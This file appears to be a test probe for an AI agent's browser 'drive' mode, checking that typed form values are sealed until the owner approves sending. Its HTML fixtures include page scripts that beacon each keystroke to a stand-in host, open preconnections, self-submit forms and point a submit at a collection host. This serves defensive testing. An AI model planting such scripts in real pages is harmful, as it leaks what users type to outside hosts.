"""One case of Jarvis filling in pages in his own window (agent.browser with drive=True, build plan item 7, part 2), run
in a process of its own by tests/test_agent_drive_browser.py so QtWebEngine never starts inside the shared unittest
process.

    python.exe -B tests/drive_browser_probe.py <case>      prints one JSON line (the case's findings)

Cases:
    drive_local   local pages only (offscreen: every network request blocked, Chromium's proxy is not there): typing in
                  the DOM, the seal, the page's own submit refused while sealed, the ring, the focus, Don't (the page goes
                  before the seal lifts), tabs (three, a fourth refused, target=_blank as a new tab, switch, close), a
                  drive tab's sandbox against a research one's, dialogs, pickers and downloads, "opens big"
    drive_gate    the real network gate with a fake resolver and connector (the one server anything can reach is a
                  listener of this process that holds what it gets): tunnels open before typing, all cut at the first
                  value, none after, and the gate working again once the page went
    drive_send    a little HTTP site of this process stands where the gate would (plain http only, on loopback): nothing
                  reaches it before the owner's Send, the GET and the POST reach it with exactly the values typed after
                  it, and a Stop while sealed destroys the page before the seal lifts
    drive_fixes   local pages only: the review's fixes in a real page (what Jarvis set kept by element across a new
                  list, a submit's own action and target, what a press does, a value too long for a card, the press's
                  own check in its task, a form that does not go and one a script takes over, a list from where the
                  page stands)

Every value is invented; files go only to temporary folders; no real site is ever reached.
"""

from __future__ import annotations

import json
import os
import socket
import sys
import tempfile
import threading
import time
from collections.abc import Callable
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlsplit

PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

FORM = "https://www.example.org/form"
TWO = "https://two.example.org/start"
MORE = "https://more.example.net/about"
THREE = "https://three.example.org/"
FOUR = "https://four.example.org/"
AUTO = "https://www.example.org/auto"
HOOKS = "https://www.example.org/hooks"
NAME = "Ada Lovelace"
NOTE = "Line one\nLine two & more"

FIXES ="https://www.example.org/fixes"
# The review's fixes (drive_fixes): a submit with its own action, one with its own target, a plain button, a box, a
# required field, a hidden field, a second form whose script takes the submit over, and a button far down the page.
FIXES_PAGE = """<!doctype html><html><head><title>Fixes</title></head><body style="margin:0;background:#fff">
<form id=f method=post action="https://www.example.org/in">
<p><input id=a name=a aria-label="First"></p>
<p><input id=req name=req required aria-label="Needed"></p>
<p><input type=checkbox id=box name=box aria-label="Box"></p>
<input type=hidden id=long name=long value="">
<p><button type=submit id=go formaction="https://collect.example.net/x" formmethod=get>Go</button>
<button type=submit id=win formtarget=_blank>Win</button> <button type=button id=plain>Plain</button></p>
</form>
<form id=g method=post action="https://www.example.org/in2"><p><input id=b name=b aria-label="Second">
<button type=submit id=hold>Hold</button></p></form>
<div style="height:3000px"></div><p><button id=low>Low</button></p>
<script>
document.getElementById('f').addEventListener('submit', function () { window.__submits = (window.__submits || 0) + 1; });
document.getElementById('g').addEventListener('submit', function (e) { e.preventDefault(); document.title = 'held'; });
</script></body></html>"""

# A form the owner wants filled in. Its own script does what a page might: a beacon of each keystroke, a pre-connection
# (which no request interceptor sees), and a submit of its own 400 ms after the first one.
FORM_PAGE = """<!doctype html><html><head><title>Sign up</title></head><body style="margin:0;background:#fff">
<h1 style="margin:8px">Sign up for the list</h1>
<form id=f method=METHOD action="ACTION" style="margin:8px">
<p><label for=name>Your name</label> <input id=name name=name></p>
<p><label for=note>A note</label> <textarea id=note name=note></textarea></p>
<p><label for=size>Size</label> <select id=size name=size><option>Small</option><option>Large</option></select></p>
<input type=hidden name=token value=t-123>
<p><button type=submit id=go>Send it</button></p>
</form>
<p style="margin:8px"><a id=more href="MORE" target=_blank>More about it</a></p>
<pre id=out></pre>
<script>
var out = document.getElementById('out'), tries = 0;
function say(w) { out.textContent += w + '\\n'; }
OPENERS
document.getElementById('name').addEventListener('input', function (event) {
  var value = event.target.value;
  try { fetch('BEACON' + encodeURIComponent(value)).then(function () { say('beacon:LOADED'); },
                                                       function () { say('beacon:refused'); }); }
  catch (e) { say('beacon:threw'); }
  tries += 1;
  var link = document.createElement('link'); link.rel = 'preconnect';
  link.href = 'PRECONNECT'.replace('N', String(tries)); document.head.appendChild(link);
  if (tries === 1) {
    setTimeout(function () { try { document.getElementById('f').submit(); say('self-submit:tried'); }
                             catch (e) { say('self-submit:threw'); } }, 400);
  }
});
</script></body></html>"""
OPENERS = """for (var i = 1; i <= 6; i++) { try { fetch('https://open' + i + '.example.org/x').catch(function () {}); }
                                 catch (e) {} }"""
PLAIN = "<!doctype html><html><head><title>TITLE</title></head><body style='background:#fff'><h1>TITLE</h1></body></html>"
# A page whose own script sends a form at once (nothing typed): only a drive tab's sandbox lets it go out at all.
AUTO_PAGE = """<!doctype html><html><head><title>Auto</title></head><body>
<form id=a method=get action="https://www.example.org/auto-sent"><input name=q value=x></form>
<script>setTimeout(function () { document.getElementById('a').submit(); }, 100);</script></body></html>"""
HOOKS_PAGE = """<!doctype html><html><head><title>Hooks</title></head><body><pre id=out></pre><a id=dl></a>
<input type=file id=picker>
<script>
var out = document.getElementById('out');
function say(name, value) { out.textContent += name + '=' + value + '\\n'; }
try { say('open', window.open('https://www.example.org/popup') === null ? 'null' : 'window'); } catch (e) { say('open', 'threw'); }
try { alert('probe'); say('confirm', confirm('probe')); say('prompt', prompt('probe', 'x')); } catch (e) { say('dialogs', 'threw'); }
try { document.getElementById('picker').click(); say('picker', 'clicked'); } catch (e) { say('picker', 'threw'); }
try { var a = document.getElementById('dl'); a.href = 'data:text/plain,probe'; a.download = 'drive-probe.txt'; a.click(); } catch (e) {}
try { var f = document.createElement('iframe'); f.src = 'data:application/octet-stream,probe'; document.body.appendChild(f); } catch (e) {}
</script></body></html>"""


def form_page(method: str, action: str, *, beacon: str, preconnect: str, openers: str = "") -> str:
    return (FORM_PAGE.replace("METHOD", method).replace("ACTION", action).replace("MORE", MORE)
            .replace("BEACON", beacon).replace("PRECONNECT", preconnect).replace("OPENERS", openers))


def plain(title: str) -> str:
    return PLAIN.replace("TITLE", title)


def children(name: str = "QtWebEngineProcess.exe") -> list[int]:
    from tests.snapshot_probe import children as found

    return found(name)


class _Holder:
    """Where the fake connector sends every tunnel: it takes the connection and holds it (no answer, as a server that is
    slow to speak), counting connections taken and those ended."""

    def __init__(self) -> None:
        self._server = socket.socket()
        self._server.bind(("127.0.0.1", 0))
        self._server.listen(64)
        self._server.settimeout(0.2)
        self.port = self._server.getsockname()[1]
        self.taken = 0
        self.ended = 0
        self._lock = threading.Lock()
        self._stop = False
        threading.Thread(target=self._serve, daemon=True).start()

    def open_now(self) -> int:
        with self._lock:
            return self.taken - self.ended

    def _serve(self) -> None:
        while not self._stop:
            try:
                connection, _address = self._server.accept()
            except OSError:
                continue
            with self._lock:
                self.taken += 1
            threading.Thread(target=self._hold, args=(connection,), daemon=True).start()

    def _hold(self, connection: socket.socket) -> None:
        with connection:
            connection.settimeout(60)
            try:
                while connection.recv(4096):
                    pass
            except OSError:
                pass
        with self._lock:
            self.ended += 1

    def stop(self) -> None:
        self._stop = True
        self._server.close()


class _FormSite:
    """Stands where the network gate would (Chromium's proxy), on loopback only, and answers plain http as a site would:
    the form pages, and "Thanks" for what they send. ``hits``: (method, path, query, body) of every request it answered.
    Sealed, it refuses every request as the gate would refuse every new connection (``refused``)."""

    def __init__(self, pages: dict[str, str]) -> None:
        self.pages = pages
        self.hits: list[tuple[str, str, str, str]] = []
        self.refused = 0
        self.seals: list[bool] = []
        self.cuts = 0
        self.sealed = False
        self.allowed: set[str] = set()
        self.allows: list[list[str]] = []
        self._server = socket.socket()
        self._server.bind(("127.0.0.1", 0))
        self._server.listen(32)
        self._server.settimeout(0.2)
        self._stop = False

    def start(self) -> int:
        threading.Thread(target=self._serve, daemon=True).start()
        return self._server.getsockname()[1]

    def seal(self, sealed: bool) -> None:
        self.sealed = bool(sealed)
        self.seals.append(bool(sealed))

    def allow(self, hosts: Any) -> None:
        """As the gate's: while sealed, only these hosts are still answered (the owner's Send)."""
        self.allowed = {str(host) for host in hosts}
        self.allows.append(sorted(self.allowed))

    def cut(self) -> int:
        self.cuts += 1
        return 0

    def counts(self) -> dict[str, int]:
        return {"hits": len(self.hits), "refused": self.refused}

    def stop(self) -> None:
        self._stop = True

    def _serve(self) -> None:
        while not self._stop:
            try:
                connection, _address = self._server.accept()
            except OSError:
                continue
            threading.Thread(target=self._answer, args=(connection,), daemon=True).start()

    def _answer(self, connection: socket.socket) -> None:
        with connection:
            connection.settimeout(5)
            raw = b""
            try:
                while b"\r\n\r\n" not in raw:
                    piece = connection.recv(4096)
                    if not piece:
                        return
                    raw += piece
                head, _sep, body = raw.partition(b"\r\n\r\n")
                lines = head.decode("latin-1").split("\r\n")
                method, target, _version = lines[0].split(" ", 2)
                host = (urlsplit(target).hostname or "").casefold()
                if (self.sealed and host not in self.allowed) or method == "CONNECT":
                    self.refused += 1
                    connection.sendall(b"HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                    return
                length = next((int(line.split(":", 1)[1]) for line in lines if line.lower().startswith("content-length:")),
                              0)
                while len(body) < length:
                    piece = connection.recv(4096)
                    if not piece:
                        break
                    body += piece
                parts = urlsplit(target)
                self.hits.append((method, parts.path, parts.query, body.decode("utf-8", "replace")))
                page = self.pages.get(parts.path, plain("Thanks"))
                data = page.encode("utf-8")
                connection.sendall(f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: "
                                   f"{len(data)}\r\nConnection: close\r\n\r\n".encode("ascii") + data)
            except OSError:
                pass


def main(case: str) -> dict[str, Any]:
    from briefing_reader import snapshot_engine, snapshot_gate, snapshots

    if case in ("drive_local", "drive_fixes"):
        os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = " ".join(snapshots.OFFLINE_FLAGS)
    else:
        os.environ.pop("QTWEBENGINE_CHROMIUM_FLAGS", None)
    snapshot_engine.prepare_application()
    from briefing_reader.agent import browser as agent_browser

    agent_browser.register_scheme()
    from PySide6.QtCore import QEventLoop, QTimer, qInstallMessageHandler
    from PySide6.QtWidgets import QApplication, QLineEdit, QWidget

    app = QApplication([sys.argv[0], "-platform", "offscreen"])
    app.setQuitOnLastWindowClosed(False)
    qInstallMessageHandler(lambda *_args: None)

    import tests  # noqa: F401 - the desktop test guard
    from briefing_reader import hud
    from briefing_reader.agent import drive, web

    hud.load_fonts(PROJECT_ROOT / "fonts")

    def wait_until(predicate: Callable[[], Any], timeout_s: float) -> bool:
        end = time.monotonic() + timeout_s
        while time.monotonic() < end:
            if predicate():
                return True
            loop = QEventLoop()
            QTimer.singleShot(15, loop.quit)
            loop.exec()
        return bool(predicate())

    def pump(seconds: float) -> None:
        wait_until(lambda: False, seconds)

    def in_thread(work: Callable[[], Any], timeout_s: float = 60.0) -> Any:
        """``work`` on a thread of its own, as a tool runs on the endpoint's; this thread is the GUI thread and pumps.
        A WebRefused comes back as its code."""
        box: dict[str, Any] = {}

        def run() -> None:
            try:
                box["value"] = work()
            except web.WebRefused as refused:
                box["value"] = f"refused:{refused.code}"
            except Exception as exc:  # noqa: BLE001 - the case looks at it
                box["value"] = f"error:{type(exc).__name__}:{exc}"
            box["done"] = True

        threading.Thread(target=run, daemon=True).start()
        wait_until(lambda: "done" in box, timeout_s)
        return box.get("value")

    def call() -> web.Call:
        return web.Call(lambda: False, 40.0)

    pages: dict[str, Any] = {}

    def html_for(url: str) -> Any:
        return pages.get(url)

    def main_world(client: Any, source: str) -> Any:
        """``source`` in the page's OWN world (what its scripts themselves see), on the GUI thread."""
        box: dict[str, Any] = {}
        client.browser()._shot.page.runJavaScript(source, 0, lambda value: box.setdefault("value", value))
        wait_until(lambda: "value" in box, 10)
        return box.get("value")

    def ref(controls: Any, name: str) -> str:
        return next(control.ref for control in controls.controls if control.name == name)

    events: list[list[Any]] = []
    watched: dict[str, Any] = {}
    real_seal = snapshot_engine.seal_drive

    def noted_seal(sealed: bool) -> None:
        profile = watched.get("profile")
        events.append([bool(sealed), profile is not None and snapshot_engine._alive(profile)])
        real_seal(sealed)

    snapshot_engine.seal_drive = noted_seal
    tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
    report: dict[str, Any] = {"case": case, "platform": app.platformName()}

    if case == "drive_local":
        from tests.snapshot_probe import DownloadsWatcher
        from PySide6.QtCore import QStandardPaths

        decided: list[str] = []

        def decide(text: str, *, main_frame: bool, local: bool = False) -> str:
            if main_frame and "auto-sent" in text:
                decided.append(text)
            return snapshots.request_problem(text, main_frame=main_frame, local=local)

        pages.update({FORM: form_page("get", "https://www.example.org/sent", beacon="https://beacon.example.org/k?v=",
                                      preconnect="https://pN.example.org"),
                      TWO: form_page("get", "https://www.example.org/sent", beacon="https://beacon.example.org/k?v=",
                                     preconnect="https://pN.example.org"),
                      MORE: plain("More"), THREE: plain("Three"), FOUR: plain("Four"),
                      AUTO: AUTO_PAGE, HOOKS: HOOKS_PAGE})
        other = QLineEdit()
        other.show()
        other.activateWindow()
        other.setFocus()
        pump(0.3)
        asked_for: list[str] = []
        for name in ("activateWindow", "raise_", "setFocus"):
            setattr(agent_browser.WatchWindow, name, lambda self, *args, n=name: asked_for.append(n))
        client = agent_browser.BrowserClient(app, poll_s=0.01, html_for=html_for, decide=decide, drive=True)
        session = drive.DriveSession(client)
        opened = in_thread(lambda: session.open_page(FORM, call()))
        report["opened"] = getattr(opened, "title", opened)
        browser = client.browser()
        window = browser.window()
        listed = in_thread(lambda: session.list_controls(call()))
        controls = listed[1]
        report["controls"] = [[control.role, control.name] for control in controls.controls]
        report["sealed_before"] = [browser.drive_sealed(), sorted(snapshot_engine._ENGINE.seals)]
        typed = in_thread(lambda: session.type_text(ref(controls, "Your name"), NAME, call()))
        report["typed"] = [getattr(typed, "chars", typed), browser.drive_sealed(), sorted(snapshot_engine._ENGINE.seals)]
        report["dom_name"] = main_world(client, "document.getElementById('name').value")
        ring = window.ring_rect()
        report["ring"] = None if ring is None else [ring.x(), ring.y(), ring.width(), ring.height()]
        report["page_area"] = [window.page_area.width(), window.page_area.height()]
        focus = app.focusWidget()
        report["focus"] = [asked_for, focus is not None and window.isAncestorOf(focus),
                           any(child.hasFocus() for child in window.findChildren(QWidget)),
                           sorted({child.focusPolicy().name for child in window.findChildren(QWidget)})]
        pump(1.0)                                    # the page's own submit (400 ms after the first keystroke) and beacons
        report["while_sealed"] = [main_world(client, "document.getElementById('name').value"),
                                  main_world(client, "document.getElementById('out').textContent"),
                                  browser.hook_counts().get("held", 0)]
        chose = in_thread(lambda: session.choose(ref(controls, "Size"), call(), option="Large"))
        report["chose"] = getattr(chose, "value", chose)
        plan = in_thread(lambda: session.press(ref(controls, "Send it"), call()))
        report["card"] = [[line.kind, line.text, line.value, line.amber] for line in plan.card_lines()]
        watched["profile"] = browser._shot.profile
        events.clear()
        plan.decide(False, None, lambda: False)
        report["declined"] = wait_until(lambda: not browser.drive_sealed() and browser.tabs() == (2,), 10)
        report["declined_events"] = list(events)
        report["after_decline"] = [session.tab_count(), list(browser.tabs()), browser.has_page(),
                                   sorted(snapshot_engine._ENGINE.seals)]
        watched.pop("profile", None)

        # Tabs: the fresh tab, a link that opens a new window as a new tab, a third, and no fourth.
        two = in_thread(lambda: session.open_page(TWO, call()))
        report["two"] = getattr(two, "title", two)
        links = in_thread(lambda: session.list_controls(call()))
        clicked = in_thread(lambda: session.click(ref(links[1], "More about it"), call()))
        report["blank_link"] = [getattr(getattr(clicked, "opened", None), "title", clicked), session.tab_count(),
                                list(browser.tabs()), browser.tab_shown()]
        three = in_thread(lambda: session.open_page(THREE, call(), new_tab=True))
        report["three"] = [getattr(three, "title", three), session.tab_count(), list(browser.tabs())]
        report["chips"] = [list(chip) for chip in window.tab_chips()]
        four = in_thread(lambda: session.open_page(FOUR, call(), new_tab=True))
        report["four"] = [str(four), session.tab_count(), list(browser.tabs())]
        report["fourth_at_the_window"] = in_thread(lambda: client.new_tab(99, timeout_s=5, cancelled=lambda: False))
        switched = in_thread(lambda: session.switch_tab(1, call()))
        read = web.read_page(in_thread(lambda: client.script(web.read_script(), timeout_s=5, cancelled=lambda: False)))
        report["switched"] = [switched, read.title if read is not None else None, browser.tab_shown(),
                              [list(chip) for chip in window.tab_chips()]]
        other_tab = in_thread(lambda: client.act(browser.tabs()[2], web.read_script(), settle_s=0, timeout_s=5,
                                                 cancelled=lambda: False))
        other_read = web.read_page(other_tab.answer) if other_tab.ok else None
        report["read_a_tab_not_shown"] = other_read.title if other_read is not None else None
        closed = in_thread(lambda: session.close_tab(3, call()))
        report["closed"] = [closed, list(browser.tabs()), browser.tab_shown(), [list(c) for c in window.tab_chips()]]
        gone = in_thread(lambda: client.act(99, web.read_script(), settle_s=0, timeout_s=5, cancelled=lambda: False))
        report["act_no_tab"] = [gone.ok, gone.answer]

        # A drive tab's sandbox lets a page send a form; a research window's (and any other) does not.
        auto = in_thread(lambda: session.open_page(AUTO, call()))
        pump(0.8)
        report["auto_drive"] = [getattr(auto, "title", auto), len(decided)]
        plain_client = agent_browser.BrowserClient(app, poll_s=0.01, html_for=html_for, decide=decide)
        plain_session = web.WebSession(plain_client)
        decided.clear()
        in_thread(lambda: plain_session.open_page(AUTO, call()))
        pump(0.8)
        report["auto_plain"] = len(decided)
        report["sandboxes"] = [browser._sandbox(browser._shot), plain_client.browser()._sandbox(plain_client.browser()._shot)]
        plain_client.shutdown()
        pump(0.3)

        # Dialogs, pickers and downloads stay refused in a drive tab.
        watcher = DownloadsWatcher(QStandardPaths.writableLocation(QStandardPaths.StandardLocation.DownloadLocation))
        watcher.start()
        in_thread(lambda: session.open_page(HOOKS, call()))
        pump(1.5)
        hooks = web.read_page(in_thread(lambda: client.script(web.read_script(), timeout_s=5, cancelled=lambda: False)))
        report["hooks_text"] = hooks.text if hooks is not None else ""
        report["hooks"] = browser.hook_counts()
        report["top_levels"] = sorted(type(widget).__name__ for widget in QApplication.topLevelWidgets()
                                      if widget.isVisible() and widget is not other)
        report.update(watcher.finish())
        report["download_folder_entries"] = sorted(os.listdir(snapshot_engine.download_folder()))

        # "Opens big": the window grows, never activated, the page goes after its still.
        screen = window.screen().availableGeometry()
        # The offscreen screen is small: the window is put at a size it has on a real one (half of it, or less).
        window.setGeometry(screen.x() + 16, screen.y() + 16, screen.width() // 2, screen.height() // 2)
        pump(0.3)
        before = window.geometry()
        report["before_big"] = [before.width() * before.height(), screen.width() * screen.height()]
        client.end_run(linger=True, hold=True, big=True)
        rect = agent_browser.big_rect(screen, before)
        report["big_size"] = [rect.width() * rect.height(), window.windowHandle() is not None and window.isVisible()]
        report["big_now"] = [window.geometry().getRect() == rect.getRect(), browser.has_page(), browser._frozen]
        pump(1.2)
        report["big_after"] = [window.isVisible(), window.geometry().getRect() == rect.getRect(), browser.has_page(),
                               window.covered(), window.strip_texts()[0], list(asked_for)]
        client.shutdown()
        other.close()
    elif case == "drive_gate":
        holder = _Holder()
        made: list[snapshot_gate.ConnectGate] = []

        def resolve(_host: str, _port: int) -> list[str]:
            return ["93.184.215.14"]

        def connect(_address: str, _port: int, timeout: float) -> socket.socket:
            return socket.create_connection(("127.0.0.1", holder.port), timeout=timeout)

        def gate_factory() -> snapshot_gate.ConnectGate:
            made.append(snapshot_gate.ConnectGate(resolve=resolve, connect=connect))
            return made[-1]

        snapshot_engine._gate_factory = gate_factory
        snapshot_engine._test_platform = lambda: False
        pages[FORM] = form_page("get", "https://www.example.org/sent", beacon="https://beacon.example.org/k?v=",
                                preconnect="https://pN.example.org", openers=OPENERS)
        pages[TWO] = form_page("get", "https://www.example.org/sent", beacon="https://beacon.example.org/k?v=",
                               preconnect="https://pN.example.org", openers=OPENERS.replace("open", "again"))
        client = agent_browser.BrowserClient(app, poll_s=0.01, html_for=html_for, drive=True)
        session = drive.DriveSession(client)
        opened = in_thread(lambda: session.open_page(FORM, call()))
        report["opened"] = getattr(opened, "title", opened)
        wait_until(lambda: holder.open_now() >= 3, 10)
        gate = made[0]
        browser = client.browser()
        report["before"] = [gate.counts(), holder.taken, holder.open_now()]
        listed = in_thread(lambda: session.list_controls(call()))
        typed = in_thread(lambda: session.type_text(ref(listed[1], "Your name"), "Ada", call()))
        report["typed"] = getattr(typed, "chars", typed)
        report["sealed"] = [snapshot_engine.gate_sealed(), browser.drive_sealed()]
        report["all_cut"] = wait_until(lambda: holder.open_now() == 0, 5)
        at_seal = [gate.counts(), holder.taken]
        pump(1.5)                                  # the page's beacons, pre-connections and its own submit
        report["at_seal"] = at_seal
        report["after"] = [gate.counts(), holder.taken, holder.open_now(), browser.hook_counts().get("held", 0)]
        report["dom_name"] = main_world(client, "document.getElementById('name').value")
        watched["profile"] = browser._shot.profile
        events.clear()
        closed = in_thread(lambda: session.close_tab(1, call()))
        report["closed"] = [closed, list(events), snapshot_engine.gate_sealed(), browser.drive_sealed()]
        watched.pop("profile", None)
        taken = holder.taken
        again = in_thread(lambda: session.open_page(TWO, call()))
        report["again"] = [getattr(again, "title", again), wait_until(lambda: holder.taken > taken, 10)]
        client.shutdown()
        holder.stop()
    elif case == "drive_send":
        site_pages = {
            "/get": form_page("get", "http://www.example.org/got", beacon="http://beacon.example.org/k?v=",
                              preconnect="http://pN.example.org"),
            "/post": form_page("post", "http://www.example.org/posted", beacon="http://beacon.example.org/k?v=",
                               preconnect="http://pN.example.org"),
            "/again": form_page("post", "http://www.example.org/posted", beacon="http://beacon.example.org/k?v=",
                                preconnect="http://pN.example.org"),
        }
        site = _FormSite(site_pages)
        snapshot_engine._gate_factory = lambda: site
        snapshot_engine._test_platform = lambda: False
        client = agent_browser.BrowserClient(app, poll_s=0.01, decide=lambda *_args, **_kwargs: "", drive=True)
        session = drive.DriveSession(client)
        browser_box: dict[str, Any] = {}

        def fill(path: str) -> Any:
            loaded = in_thread(lambda: client.load(f"http://www.example.org{path}", timeout_s=15,
                                                   cancelled=lambda: False))
            browser_box["browser"] = client.browser()
            site.hits.clear()                      # the form page itself
            listed = in_thread(lambda: session.list_controls(call()))
            controls = listed[1]
            in_thread(lambda: session.type_text(ref(controls, "Your name"), NAME, call()))
            in_thread(lambda: session.type_text(ref(controls, "A note"), NOTE, call()))
            in_thread(lambda: session.choose(ref(controls, "Size"), call(), option="Large"))
            return loaded, controls

        def send(controls: Any) -> Any:
            plan = in_thread(lambda: session.press(ref(controls, "Send it"), call()))
            box: dict[str, Any] = {}
            plan.decide(True, lambda outcome: box.setdefault("outcome", outcome), lambda: False)
            wait_until(lambda: "outcome" in box, 45)
            outcome = box.get("outcome")
            return plan, outcome

        loaded, controls = fill("/get")
        report["loaded"] = loaded.ok
        browser = browser_box["browser"]
        pump(1.0)                                  # the page's own submit and beacons, while sealed
        report["while_sealed"] = [list(site.hits), site.refused, browser.hook_counts().get("held", 0), list(site.seals),
                                  site.cuts]
        plan, outcome = send(controls)
        report["get_card"] = [[line.kind, line.text, line.value] for line in plan.card_lines()]
        report["get_outcome"] = [outcome.code, outcome.title] if outcome is not None else None
        report["get_hits"] = [list(hit) for hit in site.hits]
        report["get_values"] = {key: values for key, values in parse_qs(site.hits[-1][2]).items()} if site.hits else {}
        report["sealed_after_get"] = [browser.drive_sealed(), list(site.seals)]
        report["allows_get"] = list(site.allows)
        site.hits.clear()
        loaded, controls = fill("/post")
        pump(1.0)
        report["post_while_sealed"] = [list(site.hits), browser.drive_sealed()]
        plan, outcome = send(controls)
        report["post_outcome"] = [outcome.code, outcome.title] if outcome is not None else None
        report["post_hits"] = [[hit[0], hit[1]] for hit in site.hits]
        report["post_values"] = {key: values for key, values in parse_qs(site.hits[-1][3]).items()} if site.hits else {}
        # A Stop while a page holds values: it goes, and only then does the seal lift.
        site.hits.clear()
        fill("/again")
        hits_before_stop = list(site.hits)
        watched["profile"] = browser._shot.profile
        events.clear()
        client.stop()
        report["stopped"] = [wait_until(lambda: not browser.drive_sealed(), 10), list(events), hits_before_stop,
                             list(site.hits), browser.window() is None]
        watched.pop("profile", None)
        client.shutdown()
        site.stop()
    elif case == "drive_fixes":
        # The review's fixes in a real page's own scripts (local pages only): what Jarvis set is his by element, a
        # submit's own action and target, what a press does, a value too long for a card, the press's own check in its
        # task, a form that does not go and one a script takes over, and a list from where the page stands.
        pages[FIXES] = FIXES_PAGE
        client = agent_browser.BrowserClient(app, poll_s=0.01, html_for=html_for, drive=True)
        session = drive.DriveSession(client)
        opened = in_thread(lambda: session.open_page(FIXES, call()))
        report["opened"] = getattr(opened, "title", opened)
        controls = in_thread(lambda: session.list_controls(call()))[1]
        in_thread(lambda: session.type_text(ref(controls, "First"), NAME, call()))
        main_world(client, "var x = document.createElement('input'); x.name = 'x'; x.setAttribute('aria-label', 'Extra');"
                           " var a = document.getElementById('a'); a.parentNode.insertBefore(x, a); 1")
        controls = in_thread(lambda: session.list_controls(call()))[1]
        report["renumbered"] = [ref(controls, "Extra"), ref(controls, "First")]

        def plan_of(name: str) -> Any:
            plan = in_thread(lambda: session.press(ref(controls, name), call()))
            if isinstance(plan, drive.SendPlan):
                session.withdraw(plan)
                return [plan.goes_to, [[row.label, row.value] for row in plan.rows], list(plan.hosts),
                        [[item.name, item.value] for item in plan.page_values]]
            return plan

        report["go"] = plan_of("Go")
        report["plain"] = plan_of("Plain")
        report["box"] = plan_of("Box")
        report["win"] = plan_of("Win")
        main_world(client, "document.getElementById('long').value = 'z'.repeat(2500); 1")
        report["long"] = plan_of("Go")
        main_world(client, "document.getElementById('long').value = ''; 1")
        tab = session._active

        def by_name(name: str) -> int:
            return next(control.n for control in controls.controls if control.name == name)

        def raw(name: str) -> str:
            return in_thread(lambda: client.act(tab.id, drive.form_script(tab.book.gen, by_name(name), list(tab.typed)),
                                                settle_s=0, timeout_s=5, cancelled=lambda: False)).answer

        def pressed(name: str, expect: str) -> Any:
            done = in_thread(lambda: client.act(tab.id, drive.press_script(tab.book.gen, by_name(name), list(tab.typed),
                                                                         expect), settle_s=0.3, timeout_s=5,
                                                cancelled=lambda: False))
            return [json.loads(done.answer) if isinstance(done.answer, str) else done.answer, done.navigated]

        before = raw("Go")
        main_world(client, "document.getElementById('a').value = 'Someone Else'; 1")
        report["changed"] = [pressed("Go", before), main_world(client, "String(window.__submits || 0)")]
        main_world(client, f"document.getElementById('a').value = {json.dumps(NAME)}; 1")
        report["invalid"] = [pressed("Go", raw("Go")), main_world(client, "String(window.__submits || 0)")]
        report["prevented"] = [pressed("Hold", raw("Hold")), main_world(client, "document.title")]
        in_thread(lambda: session.scroll(call(), ref=ref(controls, "Low")))
        low = in_thread(lambda: session.list_controls(call()))[1]
        report["from_here"] = [low.above, [control.name for control in low.controls][:2]]
        client.shutdown()
    else:
        report["error"] = f"unknown case {case!r}"
    snapshot_engine.seal_drive = real_seal
    report["children_end"] = 0 if wait_until(lambda: not children(), 5) else len(children())
    tmp.cleanup()
    return report


if __name__ == "__main__":
    print(json.dumps(main(sys.argv[1] if len(sys.argv) > 1 else "")), flush=True)
    sys.stdout.flush()
    os._exit(0)                                # Chromium is gone: nothing more to wait for
